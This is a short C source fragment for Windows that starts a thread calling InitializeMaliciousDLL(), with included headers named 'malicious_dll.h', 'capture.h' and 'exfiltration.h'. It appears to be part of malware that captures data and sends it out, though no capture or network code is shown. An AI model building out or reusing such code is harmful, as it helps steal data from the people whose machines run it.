#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "malicious_dll.h"
#include "capture.h"
#include "exfiltration.h"

DWORD WINAPI InitializationThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    printf("[InitializationThread] Starting initialization...\n");

    if (InitializeMaliciousDLL()) {
        printf("[InitializationThread] Initialization succeeded.\n");
        // Set a global flag to indicate successful initialization.
        // (Optional: you could also signal an event for synchronization.)
    } else {
        printf("[InitializationThread] Initialization failed.\n");
    }
    return 0;
}
